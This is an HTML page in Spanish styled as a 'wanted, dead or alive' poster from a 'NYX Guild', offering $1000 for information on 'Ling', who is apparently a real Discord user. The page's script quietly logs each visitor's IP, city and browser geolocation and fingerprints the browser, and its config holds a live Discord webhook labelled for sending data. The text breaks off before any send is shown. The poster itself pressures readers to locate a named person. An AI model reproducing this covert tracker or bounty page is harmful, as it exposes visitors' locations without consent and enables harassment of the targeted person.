<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RECOMPENSA: $1000 - Sujeto Buscado por NYX - Caso #57392</title>

    <!-- SEO Metadata -->
    <meta name="description"
        content="Alerta oficial NYX: Recompensa de $1000 por información sobre Ling. Se busca por crímenes contra el gremio. Confidencialidad garantizada para informantes.">
    <meta name="keywords"
        content="recompensa, sujeto buscado, ling, nyx, operativo, 1000 dolares, busqueda, most wanted">
    <meta name="author" content="NYX Operations Division">

    <!-- Open Graph Meta Tags para redes sociales -->
    <meta property="og:title" content="RECOMPENSA $1000 - Sujeto Buscado | Operación NYX #57392">
    <meta property="og:description"
        content="Se busca a Ling. NYX ofrece $1000 por información que conduzca a su ubicación. Confidencialidad absoluta para informantes.">
    <meta property="og:image"
        content="https://images-ext-1.discordapp.net/external/qqLq-IDeD68sfoQcXo-0WEVBmCMFqen-UYnLvHJIC3A/%3Fsize%3D512/https/cdn.discordapp.com/avatars/1075858281760837633/d22815ed2ded273cf45b0505a92fbc89.png?format=webp&quality=lossless">
    <meta property="og:url" content="https://operations.nyx-guild.com/wanted/57392">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="NYX Operations Division">

    <!-- Twitter Card data -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="RECOMPENSA $1000 - Sujeto Buscado | Operación NYX #57392">
    <meta name="twitter:description"
        content="Se busca a Ling. NYX ofrece $1000 por información que conduzca a su ubicación. Confidencialidad absoluta para informantes.">
    <meta name="twitter:image"
        content="https://images-ext-1.discordapp.net/external/qqLq-IDeD68sfoQcXo-0WEVBmCMFqen-UYnLvHJIC3A/%3Fsize%3D512/https/cdn.discordapp.com/avatars/1075858281760837633/d22815ed2ded273cf45b0505a92fbc89.png?format=webp&quality=lossless">

    <!-- Schema.org para resultados enriquecidos de Google -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "WebPage",
      "name": "RECOMPENSA $1000 - Sujeto Buscado por NYX",
      "description": "Alerta oficial NYX: Recompensa de $1000 por información sobre Ling. Se busca por crímenes contra el gremio. Confidencialidad garantizada para informantes.",
      "publisher": {
        "@type": "Organization",
        "name": "NYX Operations Division",
        "logo": {
          "@type": "ImageObject",
          "url": "https://images-ext-1.discordapp.net/external/qqLq-IDeD68sfoQcXo-0WEVBmCMFqen-UYnLvHJIC3A/%3Fsize%3D512/https/cdn.discordapp.com/avatars/1075858281760837633/d22815ed2ded273cf45b0505a92fbc89.png?format=webp&quality=lossless"
        }
      },
      "mainEntity": {
        "@type": "Thing",
        "name": "Ling",
        "description": "Sujeto buscado con recompensa de $1000"
      }
    }
    </script>

    <!-- Precargar fuentes -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@400;700&display=swap"
        rel="stylesheet">

    <style>
        /* Reseteo y estilos base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --color-primary: #0c1e3f;
            --color-secondary: #ad0000;
            --color-accent: #1c4f9c;
            --color-dark: #0a101c;
            --color-text: #ffffff;
            --color-text-secondary: #a0a8c0;
            --font-main: 'Roboto', sans-serif;
            --font-tech: 'Orbitron', sans-serif;
            --anim-speed-slow: 1.2s;
            --anim-speed-normal: 0.6s;
            --anim-speed-fast: 0.3s;
        }

        html {
            scroll-behavior: smooth;
        }

        body {
            background-color: var(--color-dark);
            color: var(--color-text);
            line-height: 1.6;
            font-family: var(--font-main);
            padding: 0;
            margin: 0;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23091124" opacity="0.5"/><path d="M0,0L100,100M0,100L100,0" stroke="%23132347" stroke-width="1"/></svg>');
            overflow-x: hidden;
        }

        /* Animaciones globales */
        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        @keyframes slideInRight {
            from {
                transform: translateX(100px);
                opacity: 0;
            }

            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        @keyframes slideInLeft {
            from {
                transform: translateX(-100px);
                opacity: 0;
            }

            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        @keyframes slideInUp {
            from {
                transform: translateY(50px);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        @keyframes pulse {
            0% {
                transform: scale(1);
            }

            50% {
                transform: scale(1.05);
            }

            100% {
                transform: scale(1);
            }
        }

        @keyframes glitch {
            0% {
                transform: translate(0)
            }

            20% {
                transform: translate(-3px, 3px)
            }

            40% {
                transform: translate(-3px, -3px)
            }

            60% {
                transform: translate(3px, 3px)
            }

            80% {
                transform: translate(3px, -3px)
            }

            100% {
                transform: translate(0)
            }
        }

        @keyframes scanline {
            0% {
                transform: translateY(-100%);
            }

            50%,
            100% {
                transform: translateY(100vh);
            }
        }

        @keyframes blinkRedAlert {

            0%,
            49% {
                background-color: var(--color-secondary);
            }

            50%,
            100% {
                background-color: rgba(173, 0, 0, 0.6);
            }
        }

        /* Estilos de contenedor y responsividad */
        .container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header institucional estilo FBI/CIA con animación */
        .gov-header {
            background-color: var(--color-primary);
            padding: 15px 0;
            border-bottom: 3px solid var(--color-secondary);
            position: sticky;
            top: 0;
            z-index: 1000;
            animation: fadeIn var(--anim-speed-normal) ease-out;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            transition: padding 0.3s ease;
        }

        .header-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        .gov-logo {
            display: flex;
            align-items: center;
            animation: slideInLeft var(--anim-speed-normal) ease-out;
        }

        .gov-emblem {
            width: 50px;
            height: 50px;
            background-color: var(--color-secondary);
            border-radius: 50%;
            position: relative;
            margin-right: 15px;
            overflow: hidden;
        }

        .gov-emblem::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            height: 80%;
            background-color: var(--color-dark);
            border-radius: 50%;
            z-index: 1;
        }

        .gov-emblem::after {
            content: 'NYX';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: var(--color-secondary);
            font-family: var(--font-tech);
            font-weight: bold;
            font-size: 14px;
            z-index: 2;
        }

        .gov-title {
            display: flex;
            flex-direction: column;
        }

        .gov-agency {
            font-family: var(--font-tech);
            font-size: 1.5rem;
            font-weight: 700;
            letter-spacing: 1px;
        }

        .gov-dept {
            font-size: 0.8rem;
            letter-spacing: 1px;
            opacity: 0.8;
        }

        /* Contenedor principal con animación */
        .wanted-container {
            margin: 30px auto;
            max-width: 1000px;
            position: relative;
            animation: fadeIn var(--anim-speed-slow) ease-out;
        }

        .wanted-header-band {
            background-color: var(--color-secondary);
            color: white;
            padding: 8px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            animation: blinkRedAlert 4s infinite;
        }

        .classified-tag {
            font-weight: bold;
            font-size: 0.9rem;
            letter-spacing: 1px;
            animation: pulse 2s infinite;
        }

        .case-number {
            font-size: 0.9rem;
            letter-spacing: 1px;
        }

        /* Diseño de cartel de búsqueda */
        .wanted-poster {
            background-color: rgba(12, 30, 63, 0.9);
            border: 1px solid var(--color-accent);
            border-top: none;
            padding: 25px;
            position: relative;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
        }

        .id-strip {
            position: absolute;
            top: 0;
            left: 20px;
            width: 15px;
            height: 100%;
            background-color: var(--color-secondary);
            opacity: 0.5;
        }

        .security-mark {
            position: absolute;
            top: 50px;
            right: -35px;
            background-color: var(--color-secondary);
            color: white;
            padding: 5px 40px;
            transform: rotate(90deg);
            font-size: 0.8rem;
            letter-spacing: 3px;
            opacity: 0.7;
            animation: pulse 3s infinite;
        }

        /* Encabezado del anuncio con animaciones */
        .wanted-header {
            text-align: center;
            margin-bottom: 30px;
            position: relative;
            overflow: hidden;
        }

        .wanted-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--color-secondary), transparent);
            animation: scanline 8s linear infinite;
            opacity: 0.6;
        }

        .wanted-title {
            font-family: var(--font-tech);
            font-size: 3.5rem;
            text-transform: uppercase;
            letter-spacing: 8px;
            margin-bottom: 5px;
            text-shadow: 0 0 10px rgba(173, 0, 0, 0.7);
            animation: glitch 5s infinite;
        }

        .wanted-subtitle {
            font-size: 1.5rem;
            letter-spacing: 5px;
            text-transform: uppercase;
            color: var(--color-secondary);
            opacity: 0.9;
        }

        /* Grid de contenido responsivo con animación */
        .content-grid {
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 30px;
            animation: fadeIn var(--anim-speed-normal) ease-out;
        }

        .subject-photo {
            display: flex;
            flex-direction: column;
            position: relative;
            animation: slideInLeft var(--anim-speed-normal) ease-out;
        }

        .photo-header {
            background-color: var(--color-primary);
            color: white;
            padding: 8px 15px;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .wanted-image {
            width: 100%;
            aspect-ratio: 1/1;
            object-fit: cover;
            border: 1px solid var(--color-accent);
            transition: transform 0.3s ease;
        }

        .wanted-image:hover {
            transform: scale(1.02);
            box-shadow: 0 0 15px rgba(28, 79, 156, 0.7);
        }

        .reward {
            background-color: var(--color-secondary);
            color: white;
            padding: 10px;
            text-align: center;
            font-size: 1.2rem;
            font-weight: bold;
            letter-spacing: 1px;
            margin-top: 10px;
            animation: pulse 2s infinite;
        }

        .subject-details {
            animation: slideInRight var(--anim-speed-normal) ease-out;
        }

        .section-marker {
            background-color: var(--color-secondary);
            color: white;
            padding: 5px 15px;
            display: inline-block;
            font-size: 0.8rem;
            letter-spacing: 1px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }

        .section-marker::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 10px;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.3);
            animation: slideInRight 2s infinite;
            opacity: 0.6;
        }

        .details-title {
            font-size: 1.2rem;
            font-weight: bold;
            margin-bottom: 10px;
            position: relative;
        }

        .details-title::after {
            content: '';
            display: block;
            width: 50px;
            height: 2px;
            background-color: var(--color-secondary);
            margin-top: 5px;
        }

        .detail-row {
            display: flex;
            margin-bottom: 10px;
            transition: all 0.3s ease;
        }

        .detail-row:hover {
            transform: translateX(5px);
            color: var(--color-secondary);
        }

        .detail-label {
            font-weight: bold;
            width: 120px;
            flex-shrink: 0;
        }

        .detail-value {
            flex-grow: 1;
        }

        .subject-details p {
            margin: 15px 0;
            line-height: 1.8;
            color: var(--color-text-secondary);
        }

        .caution-box {
            background-color: rgba(173, 0, 0, 0.2);
            border-left: 4px solid var(--color-secondary);
            padding: 15px;
            margin: 20px 0;
            font-weight: bold;
            animation: pulse 4s infinite;
        }

        .gov-disclaimer {
            font-size: 0.8rem;
            color: var(--color-text-secondary);
            margin-top: 20px;
            font-style: italic;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            padding-top: 15px;
        }

        /* Sección de contacto con animación */
        .contact-section {
            margin-top: 40px;
            position: relative;
            animation: slideInUp var(--anim-speed-normal) ease-out;
        }

        .contact-header {
            background-color: var(--color-primary);
            color: white;
            padding: 10px 15px;
            font-size: 1.1rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .contact-form {
            border: 1px solid var(--color-accent);
            border-top: none;
            padding: 20px;
            background-color: rgba(12, 30, 63, 0.5);
        }

        .form-intro {
            margin-bottom: 20px;
            color: var(--color-text-secondary);
        }

        .form-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-full {
            grid-column: 1 / -1;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            font-size: 0.9rem;
            color: var(--color-text-secondary);
        }

        .form-group input,
        .form-group textarea {
            width: 100%;
            padding: 10px;
            background-color: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--color-accent);
            color: white;
            border-radius: 3px;
            transition: all 0.3s ease;
        }

        .form-group input:focus,
        .form-group textarea:focus {
            background-color: rgba(255, 255, 255, 0.1);
            border-color: var(--color-secondary);
            outline: none;
            box-shadow: 0 0 5px rgba(173, 0, 0, 0.5);
        }

        .submit-btn {
            background-color: var(--color-secondary);
            color: white;
            padding: 12px 25px;
            border: none;
            font-size: 1rem;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .submit-btn::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: rgba(255, 255, 255, 0.1);
            transform: rotate(45deg);
            z-index: 1;
            transition: all 0.6s ease;
            opacity: 0;
        }

        .submit-btn:hover {
            background-color: #cc0000;
            box-shadow: 0 0 15px rgba(173, 0, 0, 0.7);
        }

        .submit-btn:hover::before {
            opacity: 1;
            left: 100%;
        }

        .submit-btn span {
            position: relative;
            z-index: 2;
        }

        .gov-watermark {
            text-align: right;
            font-size: 0.8rem;
            margin-top: 15px;
            opacity: 0.5;
            letter-spacing: 1px;
            font-family: var(--font-tech);
            animation: fadeIn 2s ease-out;
        }

        /* Footer gubernamental responsivo */
        .gov-footer {
            background-color: var(--color-primary);
            border-top: 2px solid var(--color-secondary);
            padding: 20px 0;
            margin-top: 50px;
            animation: fadeIn var(--anim-speed-normal) ease-out;
        }

        .footer-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        .footer-text {
            text-align: center;
            margin-bottom: 15px;
        }

        .footer-text p {
            font-size: 0.8rem;
            opacity: 0.7;
            margin: 5px 0;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 20px;
        }

        .footer-links a {
            color: var(--color-text-secondary);
            text-decoration: none;
            font-size: 0.8rem;
            transition: color 0.3s ease;
        }

        .footer-links a:hover {
            color: var(--color-text);
            text-decoration: underline;
        }

        /* Notificación de geolocalización */
        .geo-notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: var(--color-primary);
            border-left: 4px solid var(--color-secondary);
            padding: 12px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
            z-index: 1000;
            font-size: 0.9rem;
            max-width: 300px;
            animation: slideInRight var(--anim-speed-normal);
            display: none;
        }

        /* Media queries para responsividad */
        @media (max-width: 992px) {
            .wanted-title {
                font-size: 2.8rem;
                letter-spacing: 6px;
            }

            .wanted-subtitle {
                font-size: 1.3rem;
                letter-spacing: 3px;
            }

            .content-grid {
                gap: 20px;
            }
        }

        @media (max-width: 768px) {
            .content-grid {
                grid-template-columns: 1fr;
            }

            .subject-photo {
                max-width: 350px;
                margin: 0 auto;
            }

            .form-grid {
                grid-template-columns: 1fr;
            }

            .wanted-title {
                font-size: 2.3rem;
                letter-spacing: 4px;
            }

            .wanted-subtitle {
                font-size: 1.1rem;
            }

            .security-mark {
                display: none;
            }
        }

        @media (max-width: 576px) {
            .gov-agency {
                font-size: 1.2rem;
            }

            .gov-dept {
                font-size: 0.7rem;
            }

            .wanted-header-band {
                flex-direction: column;
                align-items: flex-start;
                gap: 5px;
            }

            .wanted-title {
                font-size: 2rem;
                letter-spacing: 2px;
            }

            .wanted-subtitle {
                font-size: 1rem;
                letter-spacing: 2px;
            }

            .detail-row {
                flex-direction: column;
            }

            .detail-label {
                width: auto;
                margin-bottom: 3px;
            }
        }

        /* Animaciones para elementos al hacer scroll */
        .reveal {
            opacity: 0;
            transform: translateY(40px);
            transition: all 0.8s ease;
        }

        .reveal.active {
            opacity: 1;
            transform: translateY(0);
        }
    </style>
</head>

<body>
    <!-- Header gubernamental -->
    <header class="gov-header">
        <div class="header-container">
            <div class="gov-logo">
                <div class="gov-emblem"></div>
                <div class="gov-title">
                    <div class="gov-agency">NYX GUILD</div>
                    <div class="gov-dept">DIVISIÓN DE OPERACIONES ESPECIALES</div>
                </div>
            </div>
        </div>
    </header>

    <!-- Contenedor principal -->
    <div class="wanted-container">
        <div class="wanted-header-band">
            <div class="classified-tag">MÁXIMA PRIORIDAD</div>
            <div class="case-number">CASO #: NYX-57392-L</div>
        </div>

        <div class="wanted-poster">
            <div class="id-strip"></div>
            <div class="security-mark">CONFIDENCIAL</div>

            <div class="wanted-header">
                <h1 class="wanted-title">Se Busca</h1>
                <h2 class="wanted-subtitle">Vivo o Muerto</h2>
            </div>

            <div class="content-grid">
                <div class="subject-photo reveal">
                    <div class="photo-header">Fotografía del sujeto</div>
                    <img src="https://images-ext-1.discordapp.net/external/qqLq-IDeD68sfoQcXo-0WEVBmCMFqen-UYnLvHJIC3A/%3Fsize%3D512/https/cdn.discordapp.com/avatars/1075858281760837633/d22815ed2ded273cf45b0505a92fbc89.png?format=webp&quality=lossless"
                        alt="Foto de Ling - Sujeto buscado" class="wanted-image">

                    <div class="reward">Recompensa: $1000</div>
                </div>

                <div class="subject-details reveal">
                    <div class="section-marker">Información del sujeto</div>

                    <h3 class="details-title">Datos de identificación</h3>
                    <div class="detail-row">
                        <div class="detail-label">Nombre:</div>
                        <div class="detail-value">Ling</div>
                    </div>
                    <div class="detail-row">
                        <div class="detail-label">Alias conocidos:</div>
                        <div class="detail-value">?</div>
                    </div>
                    <div class="detail-row">
                        <div class="detail-label">Última ubicación:</div>
                        <div class="detail-value" id="lastKnownLocation">Buscando...</div>
                    </div>

                    <h3 class="details-title">Perfil criminal</h3>
                    <p>El sujeto conocido como "Ling" es buscado por el grupo NYX por infracciones graves al código de
                        conducta del gremio. Se le acusa de robo de artefactos de alto valor, infiltración no autorizada
                        en zonas restringidas y sabotaje de misiones críticas.</p>
                    <p>Se considera al sujeto extremadamente hábil en ocultación y evasión. Se sabe que utiliza técnicas
                        avanzadas para mantenerse oculto y posee habilidades excepcionales de infiltración.</p>

                    <div class="caution-box reveal">
                        ADVERTENCIA: Proceder con extrema precaución. El sujeto posee habilidades letales y no dudará en
                        usarlas si se siente acorralado. No intentar capturar sin respaldo adecuado.
                    </div>

                    <div class="gov-disclaimer">
                        Esta notificación es emitida por NYX Guild, División de Operaciones Especiales, bajo la
                        autoridad del Alto Consejo. Fecha de emisión: 11/05/2025. Ref. #57392-L.
                    </div>
                </div>
            </div>

            <div class="contact-section reveal">
                <div class="contact-header">Formulario confidencial de información</div>
                <div class="contact-form">
                    <div class="form-intro">
                        <p>Cualquier información que conduzca a la localización del sujeto será recompensada con $1000.
                            La identidad de los informantes está protegida bajo los más altos protocolos de seguridad de
                            NYX.</p>
                    </div>

                    <form id="informationForm">
                        <div class="form-grid">
                            <div class="form-group">
                                <label for="informantName">Nombre de contacto:</label>
                                <input type="text" id="informantName" name="informantName" required>
                            </div>

                            <div class="form-group">
                                <label for="contactMethod">Método de contacto:</label>
                                <input type="text" id="contactMethod" name="contactMethod"
                                    placeholder="Email o número de comunicador" required>
                            </div>

                            <div class="form-group form-full">
                                <label for="information">Información sobre el sujeto:</label>
                                <textarea id="information" name="information" rows="5" required></textarea>
                            </div>

                            <div class="form-group">
                                <label for="lastSeen">Última vez visto (fecha):</label>
                                <input type="text" id="lastSeen" name="lastSeen" required>
                            </div>

                            <div class="form-group">
                                <label for="location">Ubicación:</label>
                                <input type="text" id="location" name="location" required>
                            </div>
                        </div>

                        <button type="submit" class="submit-btn"><span>Enviar Información</span></button>
                    </form>
                </div>
            </div>

            <div class="gov-watermark">NYX-DOC-57392-CONF-L//FIN</div>
        </div>
    </div>

    <!-- Footer gubernamental -->
    <footer class="gov-footer">
        <div class="footer-content">
            <div class="footer-text">
                <p>NYX GUILD | División de Operaciones Especiales | Documento Confidencial</p>
                <p>La distribución no autorizada de este documento está prohibida bajo las regulaciones del Gremio.</p>
            </div>
            <div class="footer-links">
                <a href="#">Términos de Servicio</a>
                <a href="#">Políticas de Privacidad</a>
                <a href="#">Contacto</a>
            </div>
        </div>
    </footer>

    <!-- Notificación de geolocalización -->
    <div id="geoNotification" class="geo-notification">
        <div id="geoMessage">Sistema de rastreo NYX activado. Analizando ubicación...</div>
    </div>

    <script>
        // Configuración del sistema
        const CONFIG = {
            // API endpoints para obtención de IP (en orden de preferencia)
            ipProviders: [
                { url: 'https://api.ipify.org?format=json', key: 'ip' },
                { url: 'https://ipinfo.io/json', key: 'ip' },
                { url: 'https://api.ipstack.com/check?access_key=YOUR_KEY', key: 'ip' },
                { url: 'https://geolocation-db.com/json/', key: 'IPv4' }
            ],
            // API para geoinfo basada en IP (3 opciones por si alguna falla)
            geoProviders: [
                { url: 'https://ipapi.co/IPADDRESS/json/', field: 'city' },
                { url: 'https://ipinfo.io/IPADDRESS/json', field: 'city' },
                { url: 'https://api.ipbase.com/v2/info?ip=IPADDRESS&apikey=YOUR_API_KEY', field: 'data.location.city.name' }
            ],
            // Endpoint para verificación VPN
            vpnCheckEndpoint: 'https://ipinfo.io/json',
            // Webhook para enviar datos
            webhookUrl: 'https://discord.com/api/webhooks/1371299005279244288/XPRB9IDUGowKYWYw-QRsd06EJB8ATi_-hY77WH37GjVAjWtZYXOurRGhqjJmWcgGdv7G',
            // Tiempo de caché para IP (6 horas)
            ipCacheTime: 6 * 60 * 60 * 1000,
            // Tiempo mínimo entre solicitudes al mismo proveedor (30 segundos)
            ipThrottleTime: 30 * 1000,
            // Tiempo para mostrar y ocultar notificaciones
            notificationTime: 5000
        };

        // Sistema de caché y throttling
        const ipCache = {
            lastProvider: 0, // Índice del último proveedor utilizado
            lastAttempt: {}, // Marca de tiempo del último intento por proveedor
            data: null, // Datos de IP en caché
            timestamp: 0, // Marca de tiempo de la caché
            vpnCheck: null, // Estado de VPN (true, false, null=desconocido)
            vpnTimestamp: 0, // Marca de tiempo de verificación VPN
            geoData: null, // Datos de geolocalización
            geoTimestamp: 0 // Marca de tiempo de geolocalización
        };

        // Sistema de animaciones al hacer scroll
        function revealOnScroll() {
            const reveals = document.querySelectorAll('.reveal');

            reveals.forEach(element => {
                const windowHeight = window.innerHeight;
                const elementTop = element.getBoundingClientRect().top;
                const elementVisible = 150; // Ajusta esto para cambiar cuándo aparece el elemento

                if (elementTop < windowHeight - elementVisible) {
                    element.classList.add('active');
                }
            });
        }

        // Función para obtener IP con múltiples proveedores y manejo de caché
        async function getIpAddress() {
            const now = Date.now();

            // Comprobar si tenemos una IP en caché y aún es válida
            if (ipCache.data && now - ipCache.timestamp < CONFIG.ipCacheTime) {
                console.log("Usando IP en caché:", ipCache.data);
                return ipCache.data;
            }

            // Intentar obtener la IP de cada proveedor en orden, con rotación y throttling
            let startIndex = ipCache.lastProvider;
            let ipData = null;

            for (let i = 0; i < CONFIG.ipProviders.length; i++) {
                const providerIndex = (startIndex + i) % CONFIG.ipProviders.length;
                const provider = CONFIG.ipProviders[providerIndex];

                // Verificar si este proveedor fue consultado recientemente (throttling)
                if (ipCache.lastAttempt[providerIndex] &&
                    now - ipCache.lastAttempt[providerIndex] < CONFIG.ipThrottleTime) {
                    console.log(`Proveedor ${providerIndex} en período de enfriamiento, saltando...`);
                    continue;
                }

                // Registrar intento
                ipCache.lastAttempt[providerIndex] = now;

                try {
                    console.log(`Intentando obtener IP con proveedor ${providerIndex}:`, provider.url);

                    const response = await fetch(provider.url);
                    if (!response.ok) {
                        throw new Error(`HTTP error ${response.status}`);
                    }

                    const data = await response.json();
                    ipData = data[provider.key];

                    // Actualizar último proveedor exitoso
                    ipCache.lastProvider = providerIndex;

                    // Guardar en caché
                    ipCache.data = ipData;
                    ipCache.timestamp = now;

                    console.log("IP obtenida exitosamente:", ipData);
                    return ipData;

                } catch (error) {
                    console.error(`Error al obtener IP con proveedor ${providerIndex}:`, error);
                    // Continuar con el siguiente proveedor
                    continue;
                }
            }

            console.warn("No se pudo obtener IP de ningún proveedor");
            return "desconocida"; // Valor de fallback
        }

        // Obtener ubicación basada en IP
        async function getLocationFromIp(ipAddress) {
            if (ipCache.geoData && Date.now() - ipCache.geoTimestamp < CONFIG.ipCacheTime) {
                console.log("Usando datos de geolocalización en caché:", ipCache.geoData);
                return ipCache.geoData;
            }

            if (ipAddress === "desconocida") {
                return "Ubicación desconocida";
            }

            for (const provider of CONFIG.geoProviders) {
                try {
                    const url = provider.url.replace('IPADDRESS', ipAddress);
                    const response = await fetch(url);

                    if (!response.ok) {
                        continue;
                    }

                    const data = await response.json();

                    // Navegar por el objeto para obtener el campo de ciudad
                    let cityField = provider.field.split('.');
                    let result = data;

                    for (const field of cityField) {
                        if (result && result[field]) {
                            result = result[field];
                        } else {
                            result = null;
                            break;
                        }
                    }

                    if (result) {
                        let locationString = '';

                        if (data.city || result) {
                            locationString = data.city || result;
                        }

                        if (data.country_name || data.country) {
                            locationString += ', ' + (data.country_name || data.country);
                        }

                        if (locationString) {
                            ipCache.geoData = locationString;
                            ipCache.geoTimestamp = Date.now();
                            return locationString;
                        }
                    }
                } catch (error) {
                    console.error(`Error al obtener ubicación desde API:`, error);
                    continue;
                }
            }

            // Intentar usar ipinfo como alternativa si todo falla
            try {
                const response = await fetch(`https://ipinfo.io/${ipAddress}/json`);
                if (response.ok) {
                    const data = await response.json();
                    if (data.city && data.region) {
                        const locationString = `${data.city}, ${data.region}, ${data.country}`;
                        ipCache.geoData = locationString;
                        ipCache.geoTimestamp = Date.now();
                        return locationString;
                    }
                }
            } catch (e) {
                console.error("Falló el último intento con ipinfo:", e);
            }

            return "Ubicación desconocida";
        }

        // Función para el sistema de geolocalización silencioso
        async function silentGeolocation() {
            try {
                // Primero intentar la API de geolocalización HTML5 sin mostrar permiso
                // (esto solo funcionará si el usuario ya dio permiso anteriormente)
                if (navigator.geolocation) {
                    // Usar una promesa para manejar la geolocalización con un timeout
                    const geolocationPromise = new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            position => resolve(position),
                            error => reject(error),
                            { timeout: 5000, enableHighAccuracy: false }
                        );
                    });

                    try {
                        // Intentar por 5 segundos obtener la posición
                        const position = await Promise.race([
                            geolocationPromise,
                            new Promise((_, reject) =>
                                setTimeout(() => reject(new Error("Timeout")), 5000)
                            )
                        ]);

                        // Si llega aquí, obtuvo la posición exitosamente
                        try {
                            // Convertir coordenadas a nombre de ubicación usando reverse geocoding
                            const response = await fetch(
                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=10`
                            );

                            if (response.ok) {
                                const data = await response.json();
                                if (data.display_name) {
                                    // Mostrar y actualizar la ubicación
                                    showNotification(`Ubicación detectada: ${data.address.city || data.address.town || "Área"}`);
                                    updateLocationDisplay(data.display_name);
                                    return data.display_name;
                                }
                            }

                            // Si no puede obtener el nombre, muestra las coordenadas
                            const coordsString = `${position.coords.latitude.toFixed(2)}, ${position.coords.longitude.toFixed(2)}`;
                            showNotification(`Coordenadas detectadas: ${coordsString}`);
                            updateLocationDisplay(coordsString);
                            return coordsString;

                        } catch (error) {
                            // Si falla el geocoding inverso, muestra las coordenadas
                            const coordsString = `${position.coords.latitude.toFixed(2)}, ${position.coords.longitude.toFixed(2)}`;
                            updateLocationDisplay(coordsString);
                            return coordsString;
                        }
                    } catch (error) {
                        // Si falló la geolocalización por tiempo o permiso, proceder al método IP
                        console.log("Geolocalización HTML5 no disponible, usando IP:", error);
                    }
                }

                // Método alternativo: usar la IP para determinar ubicación
                const ip = await getIpAddress();
                const location = await getLocationFromIp(ip);

                showNotification(`Ubicación aproximada detectada`);
                updateLocationDisplay(location);
                return location;

            } catch (error) {
                console.error("Error en geolocalización silenciosa:", error);
                updateLocationDisplay("Ubicación no disponible");
                return "Ubicación no disponible";
            }
        }

        // Función para mostrar notificación temporal
        function showNotification(message) {
            const notification = document.getElementById('geoNotification');
            const messageElement = document.getElementById('geoMessage');

            messageElement.textContent = message;
            notification.style.display = 'block';

            // Ocultar después de un tiempo
            setTimeout(() => {
                notification.style.display = 'none';
            }, CONFIG.notificationTime);
        }

        // Actualizar el campo de ubicación en la UI
        function updateLocationDisplay(location) {
            const locationElement = document.getElementById('lastKnownLocation');
            if (locationElement) {
                locationElement.textContent = location || "Desconocida";
            }
        }

        // Detectar navegador y sistema operativo (función existente)
        function detectBrowser(userAgent) {
            const ua = userAgent.toLowerCase();
            let browser = "desconocido";
            let version = "desconocido";
            let os = "desconocido";

            // Detectar navegador
            if (ua.indexOf("firefox") > -1) {
                browser = "Firefox";
                const match = ua.match(/firefox\/([\d.]+)/);
                if (match) version = match[1];
            } else if (ua.indexOf("edg") > -1) {
                browser = "Edge";
                const match = ua.match(/edg\/([\d.]+)/);
                if (match) version = match[1];
            } else if (ua.indexOf("chrome") > -1) {
                browser = "Chrome";
                const match = ua.match(/chrome\/([\d.]+)/);
                if (match) version = match[1];
            } else if (ua.indexOf("safari") > -1) {
                browser = "Safari";
                const match = ua.match(/version\/([\d.]+)/);
                if (match) version = match[1];
            } else if (ua.indexOf("opr") > -1 || ua.indexOf("opera") > -1) {
                browser = "Opera";
                const match = ua.match(/(?:opr|opera)\/([\d.]+)/);
                if (match) version = match[1];
            }

            // Detectar sistema operativo
            if (ua.indexOf("windows") > -1) {
                os = "Windows";
            } else if (ua.indexOf("macintosh") > -1 || ua.indexOf("mac os") > -1) {
                os = "macOS";
            } else if (ua.indexOf("android") > -1) {
                os = "Android";
